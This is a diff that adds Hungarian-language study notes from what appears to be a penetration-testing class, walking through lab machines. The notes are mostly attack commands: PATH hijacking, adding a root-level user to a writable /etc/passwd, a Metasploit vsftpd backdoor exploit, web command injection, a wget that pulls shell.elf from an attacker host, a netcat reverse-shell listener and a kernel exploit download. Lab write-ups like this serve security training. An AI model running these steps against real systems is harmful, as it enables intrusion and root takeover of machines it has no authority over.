@@ -167,6 +167,65 @@ echo "import pty; pty.spawn('/bin/bash')" > random.py
 sudo -l
 sudo -u juliet /usr/bin/python3 /home/bob/pwesent_from_juliet.py
 echo $PATH$
+lsblk, df
+echo '#!/bin/bash' > df //beleteszi az első sort
+echo 'bash -i' >> df
+chmod +x df
+echo $PATH 
+export PATH=/home/juliet:vmi
+/etc/passwd joshnak van írási joga
+getfacl /etc/passwd
+
+csanad:x:0:0:Hacker felhasznalo:/root:/bin/bash
+
+x = openssl passwd -5 alma // hash majd copy paste x helyére
+su csanad
+password: alma
+
+
+
+8.gyak
+
+sudo nmap -sS -sV 40.0.7.10
+21 ftp vsftpd / 80 port open //exploitdb
+vagy metasploit msfconsole -q
+search vsftpd
+0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+use 0
+options
+set rhosts 40.0.7.10
+run // most nem volt sikeres : (
+
+dirb http://40.0.7.10/site /usr/share/wordlists/dirb/common.txt -r 
+
+wpscan --url http://40.0.7.10/site/wordpress //megnézzük h wordpress
+
+http://40.0.7.10/site/busque.php?buscar= // ha van = jel valószínűleg jól jön zhn
+443 port kell de nem lehet listeert addig míg sudo python3 -m http.server 443
+
+
+cd /tmp;rm -rf shell.elf;wget http://30.0.1.11:443/shell.elf;chmod 777 shell.elf
+
+/tmp/shell.elf
+
+utána weblapon buscar=/tmp/shell.elf
+
+python3 leállítása
+ 
+listener elindítása 
+sudo nc -lvnp 443
+
+jangow01
+zh alatt 16 alatti ubuntu
+
+célgépen gcc van c fordító 
+cd /tmp;rm -rf 45010.c;wget http://31.0.1.11:443/45010.c
+
+RCE: "klasszikus cd /tmp..."
+config.php -> jelszó
+/script/backup -> ??? (/home/jangow01 -> .bash_history)
+/etc/lsb.release 16.04 -> exploitdb 
+célponton 
 
 
 
@@ -176,6 +235,3 @@ echo $PATH$
 
 
 
-
-
-    
